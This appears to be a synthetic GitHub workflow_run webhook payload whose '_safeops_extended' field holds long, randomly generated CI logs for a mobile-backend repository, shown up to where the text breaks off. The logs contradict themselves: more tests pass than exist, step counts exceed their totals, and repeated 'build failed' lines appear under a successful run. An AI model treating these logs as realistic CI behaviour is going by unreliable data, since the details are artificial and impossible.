{
  "action": "completed",
  "workflow_run": {
    "id": 886,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "18659d573f6f7772a9e2e1ebc564df028e1384a1",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-05T12:20:11.183377Z",
    "updated_at": "2025-12-05T12:23:13.799524Z"
  },
  "repository": {
    "full_name": "startup-io/mobile-backend",
    "name": "mobile-backend"
  },
  "sender": {
    "login": "frank"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: upload_artifacts ===\nCompiling utils/utils.go...\nCache miss for key-8344\nWaiting...\nBundling vendor.css\nTest Suites: 46 passed, 47 total\n[12:20:11] DEBUG: Query executed in 39ms\nFinished.\nVerifying...\nFinished.\n[12:20:11] INFO: Processing request\nException: ValueError\nFinished.\nArtifact downloaded: 8MB\nTransforming 868 files...\nCoverage: 87% statements, 94% branches\nException: ValueError\nEnvironment: production\nCache miss for key-5353\nnpm notice: created a lockfile\n[12:20:11] INFO: Cache refreshed\nStep 7/23: Building\n[12:20:11] INFO: Connecting to database\nMinifying main.js\nTime: 62.628s\nCache saved successfully\n\u2717 build failed with exit code 68\nStep 3/22: Testing\nRan 140 tests in 19s\nConnecting to example.com:443...\nTransforming 879 files...\nTransforming 795 files...\n[12:20:11] DEBUG: Connection pool: 7 active\nLoading...\n[12:20:11] INFO: Cache refreshed\n[12:20:11] DEBUG: Memory usage: 838MB\nCache saved successfully\nCache miss for key-2976\nAlready up to date.\nLoading...\nWARNING: eslint has known vulnerabilities\nMinifying main.js\nWARNING: axios has known vulnerabilities\npip: Collecting eslint\n\u2717 build failed with exit code 58\nCache hit for key-3280\npip install: Successfully installed express-3.1\nMinifying main.js\nLoading...\nStep 10/22: Installing dependencies\nPOST /data - 201 (406ms)\nSuccess!\nGenerating source maps...\n[12:20:11] INFO: Request completed\nDone.\nArtifact uploaded: dist.zip (17MB)\nFetching submodules...\nHEAD is now at c6d6ff6\n\u2713 Task completed in 1976ms\nInstalling axios@5.6.1\nStep 4/16: Testing\nStep 17/18: Building\nCache hit for key-4498\nCompleted.\n\u2713 test completed\nLoading...\nPlatform: darwin-arm64\n[12:20:11] INFO: Processing request\nStep 13/22: Running migrations\nStep 7/16: Running migrations\n[12:20:11] DEBUG: Loading configuration\n[12:20:11] DEBUG: Query executed in 82ms\nAlready up to date.\nPulling image: python:latest\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFAILED: test_api_health\nReady.\n[12:20:11] INFO: Request completed\npip: Installing build dependencies...\nDone.\nStep 18/18: Building\nProcessing...\n[12:20:11] DEBUG: Loading configuration\n  PASS: test_user_create (270ms)\nCache hit for key-1387\nConnecting to startup.dev:443...\nnpm install: resolved 352 packages\nTransforming 738 files...\nReady.\nCache miss for key-5133\nCompiling utils/main.py...\nCompiling src/utils.go...\n\u2713 All checks passed\n[12:20:11] INFO: Starting build process\nFetching submodules...\nFinished.\nCreating production build...\nUsing Python 3.12\nWARNING: lodash has known vulnerabilities\nLoading...\nTime: 113.903s\nSwitched to branch 'bugfix/task-475'\nBundling vendor.js\nTests: 263 passed, 344 total\npip install: Successfully installed eslint-3.8\nUsing Node.js 19.8.8\n  PASS: test_cache_hit (107ms)\n[12:20:11] WARN: Deprecated API usage\n\u2713 Step 'install' succeeded\nStep 18/25: Installing dependencies\nStep 12/25: Deploying\n[12:20:11] WARN: Deprecated API usage\nInstalling react@2.7.7\nStep 11/16: Deploying\nGET /api - 201 (58ms)\nMinifying app.js\nCoverage: 80% statements, 60% branches\nyarn add: Done in 18.89s\nTest Suites: 50 passed, 45 total\nFetching submodules...\nBuilding Docker image...\nCompiling src/service.java...\nCache saved successfully\n\u2713 All checks passed\n[12:20:11] DEBUG: Connection pool: 9 active\nWaiting...\nStep 2/24: Running migrations\n[12:20:11] DEBUG: Memory usage: 360MB\n[12:20:11] WARN: Deprecated API usage\nReady.\nDone.\nPlatform: darwin-arm64\n[12:20:11] INFO: Processing request\nStep 11/25: Running migrations\nTLS handshake completed\nPOST /upload - 200 (431ms)\nConnecting to test.io:443...\nRan 44 tests in 30s\n[12:20:11] INFO: Processing request\npip: Installing build dependencies...\n\u2713 All checks passed\nNODE_ENV=test\nException: TypeError\nCompleted.\nArtifact uploaded: dist.zip (58MB)\nInstalling jest@4.15.10\nPushing to registry...\nPlatform: win32-x64\nCache saved successfully\nStep 10/21: Deploying\nGET /api - 200 (24ms)\nCreating production build...\nCache miss for key-6249\nStep 3/19: Testing\nCompiling lib/index.js...\n  PASS: test_auth_login (194ms)\nLayer 9/14: COPY command\nNODE_ENV=test\nStep 7/24: Deploying\npip: Collecting eslint\nPOST /api - 201 (229ms)\nDone.\nDone.\nArtifact uploaded: build.tar.gz (50MB)\nPulling image: node:18\nCompleted.\n[12:20:11] INFO: Starting build process\npip: Downloading lodash-2.10.tar.gz\nReady.\nCache saved successfully\nTime: 83.101s\nTest Suites: 45 passed, 15 total\nPlatform: darwin-arm64\nBundling main.js\nWARNING: webpack has known vulnerabilities\nnpm notice: package.json updated\nTime: 55.967s\nWARNING: prettier has known vulnerabilities\n[12:20:11] INFO: Connecting to database\n\u2717 build failed with exit code 32\nGenerating source maps...\n[12:20:11] DEBUG: Query executed in 97ms\nStep 2/16: Running migrations\nArtifact uploaded: dist.zip (75MB)\nBundling main.js\nWARNING: webpack has known vulnerabilities\n[12:20:11] DEBUG: Memory usage: 1585MB\nnpm notice: package.json updated\npip install: Successfully installed express-1.10\nTime: 111.306s\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 Step 'checkout' succeeded\nConnecting to cloud.services:443...\nDone.\nPOST /api - 201 (359ms)\npip install: Successfully installed express-1.19\nCompiling utils/utils.go...\n[12:20:11] INFO: Cache refreshed\nPushing to registry...\nPushing to registry...\n\u2713 Task completed in 4836ms\nTest Suites: 49 passed, 50 total\n[12:20:11] DEBUG: Memory usage: 1112MB\nStep 17/16: Running migrations\nCache miss for key-2667\nAlready up to date.\npip: Downloading express-5.10.tar.gz\nyarn add: Done in 8.81s\nImage pulled successfully\nEnvironment: staging\nPlatform: win32-x64\nLoading...\nCache restored successfully (174MB)\nGenerating source maps...\nPlatform: win32-x64\nCache hit for key-1473\nyarn add: Done in 20.35s\nCache restored successfully (416MB)\nTLS handshake completed\nException: RuntimeError\nArtifact uploaded: dist.zip (33MB)\nCache miss for key-9170\n[12:20:11] WARN: Deprecated API usage\nInstalling webpack@2.6.2\nProcessing...\nHEAD is now at 21f9b9a\nNODE_ENV=test\nImage pulled successfully\nTime: 76.225s\nArtifact uploaded: dist.zip (8MB)\nBuilding Docker image...\nNODE_ENV=production\nEnvironment: test\nStep 6/23: Installing dependencies\nWaiting...\nVerifying...\nTests: 284 passed, 370 total\nCompiling components/service.java...\n  PASS: integration/test_api_health.spec.js\nCompiling components/main.py...\nAlready up to date.\nOK\nBundling runtime.css\nInstalling axios@3.4.9\nSnapshots: 28 passed, 17 total\nGenerating source maps...\nSuccess!\nCompiling utils/handler.rs...\nCreating production build...\n\u2713 Task completed in 571ms\nImage pulled successfully\nStep 17/20: Running migrations\nTime: 91.862s\nDone.\n=== Step upload_artifacts completed ===\n=== Step: setup_node ===\nFinished.\n[12:20:11] DEBUG: Loading configuration\nTLS handshake completed\nWARNING: react has known vulnerabilities\nCompiling src/main.py...\nBundling runtime.js\nnpm notice: package.json updated\n[12:20:11] INFO: Processing request\nWARNING: webpack has known vulnerabilities\nSnapshots: 5 passed, 0 total\nCompiling utils/index.js...\nVerifying...\nPlatform: linux-x64\n\u2713 All checks passed\npip: Installing build dependencies...\npip: Downloading react-1.18.tar.gz\nStep 2/25: Building\nnpm notice: package.json updated\n[12:20:11] INFO: Cache refreshed\n\u2713 build completed\nCreating production build...\nPushing to registry...\nStep 7/20: Linting\nCompiling lib/index.js...\nStep 11/17: Deploying\nTime: 88.479s\nCache invalidated: node_modules\nArtifact uploaded: build.tar.gz (15MB)\nInstalling lodash@5.20.7\nNODE_ENV=production\n\u2713 Task completed in 2766ms\n[12:20:11] DEBUG: Initializing service\nyarn add: Done in 3.86s\nGenerating source maps...\nWARNING: express has known vulnerabilities\nPushing to registry...\nPulling image: python:latest\nTime: 90.192s\nRan 172 tests in 60s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFetching submodules...\n[12:20:11] INFO: Starting build process\nStep 8/24: Installing dependencies\nFinished.\nStep 15/23: Installing dependencies\n[12:20:11] WARN: Deprecated API usage\nnpm install: resolved 951 packages\nOK\nConnection established\n\u2713 build completed\nPulling image: python:3.11\n[12:20:11] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (22MB)\npip: Collecting webpack\nArtifact uploaded: build.tar.gz (7MB)\nCache saved successfully\nCompiling utils/handler.rs...\nWaiting...\nSwitched to branch 'feature/task-682'\nCache miss for key-3843\nGET /health - 200 (22ms)\nSnapshots: 24 passed, 29 total\nNODE_ENV=test\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nRan 36 tests in 52s\nMinifying app.js\nFinished.\nCompiling lib/utils.go...\n[12:20:11] DEBUG: Memory usage: 683MB\nArtifact uploaded: dist.zip (69MB)\nInstalling webpack@3.15.5\nUploading artifact 'coverage' (50 files)\nCompiling lib/main.py...\nGET /health - 200 (20ms)\nCompiling lib/service.java...\nTests: 290 passed, 475 total\nMinifying vendor.js\nArtifact uploaded: build.tar.gz (5MB)\nHEAD is now at 9f2f5fc\nTime: 98.972s\npip: Installing build dependencies...\nImage pulled successfully\nRan 90 tests in 18s\n\u2717 build failed with exit code 28\nReady.\nCompiling utils/utils.go...\npip: Installing build dependencies...\nFinished.\n\u2717 build failed with exit code 11\nDone.\nConnection established\npip: Downloading react-4.13.tar.gz\n\u2717 build failed with exit code 115\nNODE_ENV=test\nOK\nLayer 8/15: RUN command\n\u2717 build failed with exit code 104\nVerifying...\nBuilding Docker image...\n[12:20:11] DEBUG: Memory usage: 1535MB\nCache saved successfully\nFetching submodules...\nWARNING: prettier has known vulnerabilities\nGenerating source maps...\nEnvironment: test\n[12:20:11] DEBUG: Memory usage: 1777MB\n[12:20:11] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPlatform: win32-x64\nCache miss for key-1445\nCompiling utils/app.ts...\nnpm install: added 308 packages\nOK\nTest Suites: 27 passed, 17 total\nSnapshots: 46 passed, 19 total\nGenerating source maps...\nCache invalidated: build\nSuccess!\nSuccess!\nStep 11/20: Deploying\nStep 8/19: Linting\nEnvironment: production\n[12:20:11] DEBUG: Memory usage: 690MB\nLayer 6/15: ENV command\n[12:20:11] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (27MB)\nyarn add: Done in 21.2s\n\u2713 Step 'setup' succeeded\nTime: 93.776s\n  PASS: e2e/test_auth_login.spec.js\n[12:20:11] DEBUG: Connection pool: 19 active\nWARNING: express has known vulnerabilities\nFetching submodules...\nStep 4/24: Testing\npip: Downloading prettier-4.8.tar.gz\n[12:20:11] DEBUG: Memory usage: 1702MB\n[12:20:11] INFO: Starting build process\nNODE_ENV=production\nGenerating source maps...\nPulling image: node:3.11\nLayer 1/9: RUN command\n\u2713 deploy completed\nConnecting to test.io:443...\nWARNING: lodash has known vulnerabilities\nCache miss for key-5410\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nConnection established\nAlready up to date.\nStep 13/18: Linting\nException: NullPointerException\nTLS handshake completed\nSwitched to branch 'feature/task-971'\nGET /api - 201 (93ms)\nBundling runtime.css\nStep 8/18: Installing dependencies\nCache saved successfully\nnpm notice: package.json updated\nArtifact downloaded: 6MB\n[12:20:11] WARN: Deprecated API usage\nGET /api - 204 (13ms)\nUsing Node.js 15.11.2\nStep 20/17: Deploying\nTest Suites: 44 passed, 16 total\nEnvironment: production\nReady.\nFetching submodules...\nProcessing...\nTLS handshake completed\nGET /api - 200 (48ms)\nUsing Python 3.10\nProcessing...\nRan 52 tests in 24s\nWaiting...\nConnecting to test.io:443...\n[12:20:11] INFO: Starting build process\nUploading artifact 'build' (8 files)\nException: NullPointerException\nTests: 81 passed, 347 total\nUploading artifact 'coverage' (31 files)\nnpm install: resolved 793 packages\n  PASS: test_cache_hit (250ms)\nSuccess!\nTest Suites: 27 passed, 18 total\n[12:20:11] DEBUG: Loading configuration\nBuilding Docker image...\nAlready up to date.\n[12:20:11] INFO: Request completed\nUploading artifact 'dist' (40 files)\n[12:20:11] INFO: Cache refreshed\n[12:20:11] WARN: Deprecated API usage\n[12:20:11] INFO: Request completed\n[12:20:11] INFO: Connecting to database\n  PASS: test_db_connect (363ms)\n[12:20:11] ERROR: Connection failed\n\u2717 build failed with exit code 99\nCompiling components/utils.go...\nCompiling lib/handler.rs...\nStep 13/22: Deploying\nFAILED: test_auth_login\nnpm install: resolved 1289 packages\nBundling styles.js\nProcessing...\nTLS handshake completed\nPulling image: python:latest\nUsing Python 3.9\nPOST /api - 200 (104ms)\nnpm notice: package.json updated\nUsing Node.js 18.19.0\nLoading...\npip: Installing build dependencies...\nFetching submodules...\nConnection established\nProcessing...\npip: Downloading eslint-3.4.tar.gz\nWARNING: jest has known vulnerabilities\nCompiling lib/utils.go...\npip: Collecting prettier\n[12:20:11] DEBUG: Initializing service\nCache restored successfully (139MB)\nBundling vendor.js\nnpm install: added 381 packages\nFAILED: test_auth_login\n[12:20:11] WARN: Deprecated API usage\n  PASS: integration/test_api_health.spec.js\npip: Collecting lodash\nStep 2/24: Installing dependencies\nUsing Node.js 18.6.4\nStep 8/18: Running migrations\n[12:20:11] DEBUG: Loading configuration\n\u2713 lint completed\nStep 14/21: Installing dependencies\nStep 7/21: Building\n\u2713 validate completed\n[12:20:11] DEBUG: Loading configuration\n[12:20:11] DEBUG: Loading configuration\nStep 19/19: Building\nStep 1/20: Running migrations\nProcessing...\n[12:20:11] DEBUG: Connection pool: 1 active\nBundling vendor.js\nStep 6/15: Testing\nException: TypeError\nCompleted.\nCompleted.\n[12:20:11] WARN: Deprecated API usage\nCompleted.\npip: Installing build dependencies...\nCompleted.\n[12:20:11] DEBUG: Memory usage: 614MB\n[12:20:11] DEBUG: Connection pool: 10 active\nSnapshots: 31 passed, 32 total\nPlatform: darwin-arm64\n=== Step setup_node completed ===\n=== Step: save_cache ===\n  PASS: unit/test_auth_login.spec.js\nUsing Python 3.9\n  PASS: test_auth_login (111ms)\nStep 3/20: Running migrations\n\u2717 build failed with exit code 88\nArtifact uploaded: dist.zip (72MB)\nCache hit for key-5314\nChecking out develop branch\nFAILED: test_user_create\nTime: 19.541s\n\u2713 Task completed in 1497ms\nStep 6/16: Deploying\nPOST /upload - 202 (298ms)\npip install: Successfully installed eslint-1.2\n[12:20:11] INFO: Processing request\nStep 2/20: Linting\nTest Suites: 46 passed, 18 total\nStep 19/15: Installing dependencies\nChecking out master branch\n[12:20:11] DEBUG: Query executed in 63ms\nCache saved successfully\nyarn add: Done in 27.93s\nStep 2/15: Testing\nUploading artifact 'build' (43 files)\n[12:20:11] DEBUG: Connection pool: 7 active\nFinished.\nDone.\nFetching submodules...\nPOST /data - 202 (27ms)\nTests: 316 passed, 88 total\npip: Collecting react\nPOST /upload - 202 (89ms)\nPOST /upload - 202 (195ms)\nnpm install: added 233 packages\nLayer 2/10: ENV command\nCache saved successfully\nPlatform: win32-x64\n[12:20:11] INFO: Request completed\nUsing Python 3.12\nReady.\nArtifact downloaded: 32MB\nLoading...\nCache saved successfully\nPulling image: python:3.11\nArtifact downloaded: 45MB\nCache saved successfully\nnpm install: added 405 packages\nNODE_ENV=test\nTime: 103.164s\nTLS handshake completed\n[12:20:11] INFO: Processing request\n  PASS: test_user_create (396ms)\nCompiling lib/main.py...\nConnection established\nReady.\nGET /status - 204 (56ms)\nWARNING: jest has known vulnerabilities\nStep 2/21: Linting\n[12:20:11] DEBUG: Connection pool: 1 active\nCache invalidated: node_modules\nTest Suites: 43 passed, 24 total\nWARNING: prettier has known vulnerabilities\nCache hit for key-2046\nEnvironment: production\nCompiling components/service.java...\nCreating production build...\nEnvironment: staging\nMinifying app.js\nStep 17/24: Testing\nInstalling webpack@3.18.4\nLoading...\nSnapshots: 23 passed, 1 total\nFinished.\nGET /status - 201 (98ms)\n[12:20:11] WARN: Deprecated API usage\nTest Suites: 16 passed, 21 total\nBundling styles.css\nCache invalidated: node_modules\nCoverage: 86% statements, 76% branches\nArtifact uploaded: build.tar.gz (11MB)\nFetching submodules...\nStep 3/18: Running migrations\n[12:20:11] INFO: Connecting to database\n\u2713 Step 'checkout' succeeded\n[12:20:11] INFO: Request completed\n[12:20:11] WARN: Deprecated API usage\nCache invalidated: node_modules\nBuilding Docker image...\npip: Installing build dependencies...\n\u2713 Step 'install' succeeded\nTest Suites: 10 passed, 32 total\n\u2713 Step 'install' succeeded\nChecking out develop branch\n[12:20:11] DEBUG: Query executed in 62ms\npip install: Successfully installed axios-3.3\n\u2713 Step 'setup' succeeded\nArtifact downloaded: 10MB\nStep 13/19: Building\nBundling styles.js\nSuccess!\n[12:20:11] DEBUG: Loading configuration\nStep 14/24: Linting\nDone.\nArtifact uploaded: dist.zip (29MB)\nFinished.\nArtifact uploaded: dist.zip (17MB)\nyarn add: Done in 10.97s\n[12:20:11] INFO: Starting build process\n[12:20:11] DEBUG: Loading configuration\nnpm notice: created a lockfile\nSuccess!\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nImage pulled successfully\nCache restored successfully (407MB)\nLayer 4/14: COPY command\nTest Suites: 48 passed, 42 total\nArtifact downloaded: 21MB\n[12:20:11] DEBUG: Memory usage: 971MB\nStep 20/16: Deploying\nHEAD is now at fba1d1d\nHEAD is now at b48fe2c\nTime: 105.666s\nChecking out develop branch\nMinifying app.js\n[12:20:11] INFO: Cache refreshed\nSnapshots: 25 passed, 12 total\nUsing Node.js 14.10.9\nGET /api - 204 (53ms)\nTLS handshake completed\n[12:20:11] ERROR: Connection failed\nNODE_ENV=development\nMinifying vendor.js\nPushing to registry...\nImage pulled successfully\nFAILED: test_db_connect\nBundling main.js\nMinifying vendor.js\n\u2713 All checks passed\nArtifact downloaded: 1MB\nSnapshots: 27 passed, 6 total\n[12:20:11] DEBUG: Loading configuration\n\u2713 Step 'checkout' succeeded\nStep 19/24: Linting\nUploading artifact 'dist' (12 files)\nCompiling src/app.ts...\nWaiting...\nHEAD is now at b53fe25\n\u2713 All checks passed\n[12:20:11] DEBUG: Initializing service\nPushing to registry...\nCompiling utils/app.ts...\nProcessing...\npip install: Successfully installed prettier-4.19\n\u2717 build failed with exit code 53\nPlatform: darwin-arm64\nSnapshots: 44 passed, 13 total\nnpm install: added 111 packages\nStep 16/25: Deploying\nAlready up to date.\nArtifact downloaded: 29MB\nCompiling components/main.py...\nGenerating source maps...\n\u2713 All checks passed\nCache saved successfully\nHEAD is now at 32271b0\n[12:20:11] INFO: Request completed\nProcessing...\nCompiling utils/handler.rs...\nStep 4/19: Testing\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTime: 1.929s\n[12:20:11] ERROR: Connection failed\nArtifact downloaded: 34MB\nDone.\nCoverage: 78% statements, 91% branches\nDone.\nInstalling react@3.7.4\nGenerating source maps...\nRan 110 tests in 7s\nLayer 3/12: COPY command\nAlready up to date.\nCreating production build...\nBundling vendor.js\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2717 build failed with exit code 69\nArtifact downloaded: 10MB\nnpm install: added 195 packages\nSuccess!\nPlatform: darwin-arm64\nWaiting...\nArtifact uploaded: dist.zip (15MB)\nInstalling webpack@4.1.10\nPushing to registry...\nImage pulled successfully\n[12:20:11] DEBUG: Connection pool: 11 active\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 13/24: Testing\nChecking out master branch\nUsing Node.js 14.15.10\nHEAD is now at 4c91c04\nCreating production build...\nOptimizing 78 modules...\npip: Downloading express-4.13.tar.gz\npip: Installing build dependencies...\nStep 5/15: Testing\npip: Installing build dependencies...\nPlatform: darwin-arm64\nArtifact uploaded: build.tar.gz (28MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: unit/test_user_create.spec.js\nBundling styles.css\nVerifying...\nFAILED: test_api_health\nRan 48 tests in 29s\n\u2713 All checks passed\nTests: 238 passed, 436 total\n[12:20:11] INFO: Request completed\nInstalling lodash@3.6.8\nPushing to registry...\nInstalling axios@5.15.10\n  PASS: test_db_connect (385ms)\nImage pulled successfully\nReady.\nCompiling src/utils.go...\nAlready up to date.\n\u2713 Step 'build' succeeded\nMinifying main.js\nSwitched to branch 'bugfix/task-829'\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling utils/utils.go...\nPushing to registry...\nCompiling lib/service.java...\nUsing Node.js 19.2.3\nHEAD is now at f2e7260\nTests: 134 passed, 222 total\n\u2713 Task completed in 1368ms\nUsing Node.js 15.13.8\nNODE_ENV=production\nStep 8/18: Deploying\nTime: 15.44s\nCompiling components/main.py...\nBuilding Docker image...\npip: Collecting axios\n[12:20:11] INFO: Processing request\nArtifact downloaded: 9MB\nFinished.\nArtifact uploaded: dist.zip (83MB)\n[12:20:11] DEBUG: Query executed in 8ms\nTLS handshake completed\nStep 9/19: Linting\n=== Step save_cache completed ===\n=== Step: unit_tests ===\nReady.\npip: Installing build dependencies...\nConnecting to test.io:443...\nConnection established\nCoverage: 82% statements, 74% branches\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache saved successfully\nCache restored successfully (215MB)\n[12:20:11] DEBUG: Connection pool: 3 active\nCompleted.\n\u2713 Task completed in 2239ms\n\u2713 Step 'build' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nDone.\nTest Suites: 31 passed, 37 total\nStep 11/22: Linting\nUploading artifact 'build' (35 files)\nPlatform: linux-x64\nnpm notice: package.json updated\nnpm notice: created a lockfile\nnpm install: resolved 1544 packages\nFetching submodules...\nOptimizing 14 modules...\nWaiting...\npip: Downloading webpack-2.13.tar.gz\nPOST /upload - 200 (374ms)\nUsing Python 3.10\n[12:20:11] INFO: Starting build process\nCache invalidated: node_modules\nStep 11/15: Deploying\nyarn add: Done in 22.26s\nGET /api - 201 (39ms)\nFAILED: test_user_create\nnpm install: added 76 packages\nStep 18/18: Testing\n[12:20:11] DEBUG: Initializing service\nMinifying app.js\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nNODE_ENV=production\n\u2713 Task completed in 2572ms\nTime: 27.497s\nSwitched to branch 'feature/task-407'\nReady.\nChecking out main branch\nConnecting to test.io:443...\nOptimizing 17 modules...\nGenerating source maps...\nTest Suites: 43 passed, 23 total\nLoading...\nPOST /upload - 202 (72ms)\nCompiling utils/app.ts...\nTest Suites: 22 passed, 31 total\nWARNING: lodash has known vulnerabilities\nArtifact uploaded: dist.zip (66MB)\nOptimizing 71 modules...\nConnection established\nCache saved successfully\nMinifying main.js\nArtifact uploaded: dist.zip (73MB)\nPlatform: darwin-arm64\nOK\nLayer 2/8: COPY command\n\u2713 Task completed in 2330ms\nDone.\nStep 10/20: Running migrations\nSnapshots: 41 passed, 34 total\nNODE_ENV=development\nGenerating source maps...\nCoverage: 93% statements, 73% branches\nCoverage: 75% statements, 63% branches\npip install: Successfully installed eslint-2.12\n  PASS: test_auth_login (425ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:20:11] DEBUG: Connection pool: 11 active\nCompiling utils/handler.rs...\n\u2713 All checks passed\npip: Downloading express-4.14.tar.gz\nCoverage: 96% statements, 90% branches\n[12:20:11] DEBUG: Query executed in 14ms\nAlready up to date.\nBundling vendor.js\n  PASS: integration/test_user_create.spec.js\nSwitched to branch 'feature/task-469'\n\u2713 validate completed\n\u2717 build failed with exit code 58\nGET /health - 204 (9ms)\nArtifact uploaded: dist.zip (25MB)\nSuccess!\nArtifact uploaded: dist.zip (24MB)\n[12:20:11] DEBUG: Query executed in 13ms\nWARNING: webpack has known vulnerabilities\nBundling runtime.css\nyarn add: Done in 12.81s\nOptimizing 44 modules...\nImage pulled successfully\nCompiling lib/index.js...\nException: TypeError\nCompiling components/main.py...\n[12:20:11] INFO: Cache refreshed\nCompleted.\nUsing Python 3.9\nArtifact uploaded: build.tar.gz (8MB)\nSwitched to branch 'hotfix/task-280'\nGenerating source maps...\n[12:20:11] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (90MB)\nConnecting to example.com:443...\n[12:20:11] INFO: Request completed\nCache hit for key-2461\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/utils.go...\n[12:20:11] INFO: Cache refreshed\nHEAD is now at 0249ab5\nRan 199 tests in 14s\n[12:20:11] INFO: Starting build process\nConnection established\npip: Downloading lodash-3.9.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPulling image: python:3.11\n[12:20:11] DEBUG: Initializing service\nException: NullPointerException\nWARNING: webpack has known vulnerabilities\nTest Suites: 5 passed, 28 total\n[12:20:11] INFO: Request completed\nCompiling lib/main.py...\n\u2713 Step 'install' succeeded\nFAILED: test_auth_login\nDone.\nStep 7/19: Deploying\nPulling image: node:3.11\n\u2713 Step 'setup' succeeded\nImage pulled successfully\nUsing Node.js 14.19.9\nInstalling jest@3.0.1\nRan 89 tests in 43s\nTests: 172 passed, 436 total\nFetching submodules...\nFAILED: test_api_health\nException: RuntimeError\nConnecting to startup.dev:443...\n\u2713 deploy completed\nFinished.\nVerifying...\n[12:20:11] WARN: Deprecated API usage\nStep 8/23: Running migrations\nWARNING: lodash has known vulnerabilities\nOK\nCache saved successfully\nTime: 103.386s\nDone.\n[12:20:11] WARN: Deprecated API usage\n[12:20:11] INFO: Processing request\nStep 11/16: Running migrations\nCache saved successfully\nNODE_ENV=production\nCompiling lib/utils.go...\nNODE_ENV=development\nStep 7/22: Linting\nCache miss for key-2037\n[12:20:11] DEBUG: Query executed in 96ms\nFinished.\nProcessing...\nTime: 55.734s\n[12:20:11] DEBUG: Query executed in 93ms\nCompiling utils/app.ts...\nStep 3/17: Testing\nFinished.\n\u2713 Task completed in 1749ms\nSnapshots: 22 passed, 33 total\nnpm install: resolved 830 packages\nArtifact uploaded: build.tar.gz (20MB)\nArtifact downloaded: 33MB\n[12:20:11] WARN: Deprecated API usage\nStep 11/18: Running migrations\nCompleted.\npip: Downloading webpack-3.10.tar.gz\n\u2717 build failed with exit code 114\nUploading artifact 'dist' (29 files)\n\u2713 Step 'test' succeeded\nImage pulled successfully\nLoading...\nGET /status - 201 (89ms)\nWaiting...\nTime: 6.455s\n\u2713 Step 'checkout' succeeded\nnpm install: resolved 1780 packages\nPushing to registry...\nCoverage: 98% statements, 73% branches\nPlatform: win32-x64\nTest Suites: 37 passed, 22 total\npip: Downloading lodash-5.0.tar.gz\n  PASS: test_api_health (409ms)\nBuilding Docker image...\npip: Collecting webpack\nCoverage: 99% statements, 88% branches\n[12:20:11] INFO: Cache refreshed\nCache hit for key-5508\npip: Downloading axios-4.14.tar.gz\n[12:20:11] INFO: Cache refreshed\nArtifact downloaded: 11MB\n  PASS: e2e/test_api_health.spec.js\nUsing Node.js 18.11.10\nHEAD is now at 09d933b\n[12:20:11] WARN: Deprecated API usage\n[12:20:11] INFO: Processing request\nSnapshots: 28 passed, 50 total\nArtifact uploaded: dist.zip (94MB)\nOK\npip: Downloading express-1.1.tar.gz\nDone.\n[12:20:11] INFO: Cache refreshed\n[12:20:11] DEBUG: Query executed in 79ms\n[12:20:11] DEBUG: Query executed in 50ms\nCompiling utils/main.py...\nOptimizing 48 modules...\nCache restored successfully (377MB)\nCompiling utils/service.java...\nnpm notice: created a lockfile\nnpm install: resolved 501 packages\nEnvironment: staging\npip: Downloading axios-1.13.tar.gz\nStep 8/20: Deploying\nTLS handshake completed\n[12:20:11] DEBUG: Query executed in 46ms\nArtifact downloaded: 36MB\nReady.\nTLS handshake completed\n\u2713 All checks passed\nAlready up to date.\nArtifact uploaded: build.tar.gz (31MB)\nRan 86 tests in 18s\nSwitched to branch 'feature/task-194'\nException: ValueError\nInstalling lodash@1.3.9\nSuccess!\nLayer 4/9: RUN command\npip install: Successfully installed prettier-2.16\nCache restored successfully (238MB)\nOptimizing 78 modules...\nLayer 10/13: ENV command\nUsing Python 3.12\nArtifact uploaded: dist.zip (36MB)\nnpm install: resolved 769 packages\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 9/18: Building\nWaiting...\nCreating production build...\n[12:20:11] INFO: Starting build process\nChecking out develop branch\nnpm notice: created a lockfile\nWARNING: react has known vulnerabilities\nRan 76 tests in 47s\n=== Step unit_tests completed ===\n=== Step: e2e_tests ===\n[12:20:11] INFO: Cache refreshed\nBundling styles.js\nArtifact downloaded: 30MB\nCache saved successfully\nnpm notice: package.json updated\npip: Downloading eslint-5.11.tar.gz\nOK\nVerifying...\nRan 111 tests in 39s\nLoading...\nnpm install: resolved 1184 packages\nGET /api - 204 (42ms)\n\u2713 Step 'install' succeeded\nBundling styles.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_api_health (218ms)\nnpm install: resolved 776 packages\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPlatform: darwin-arm64\n\u2713 package completed\nWARNING: express has known vulnerabilities\nProcessing...\nPulling image: python:latest\nStep 14/19: Installing dependencies\nLayer 7/10: RUN command\npip: Installing build dependencies...\nPlatform: linux-x64\n\u2713 Step 'checkout' succeeded\nCreating production build...\nHEAD is now at 7b596c2\nWARNING: express has known vulnerabilities\nGET /health - 200 (87ms)\nUsing Node.js 16.8.0\nCache invalidated: node_modules\nStep 16/20: Testing\n[12:20:11] INFO: Starting build process\nRan 33 tests in 6s\nGenerating source maps...\npip: Collecting jest\nMinifying app.js\nTime: 94.476s\nCache hit for key-9551\nPOST /api - 200 (452ms)\nWARNING: express has known 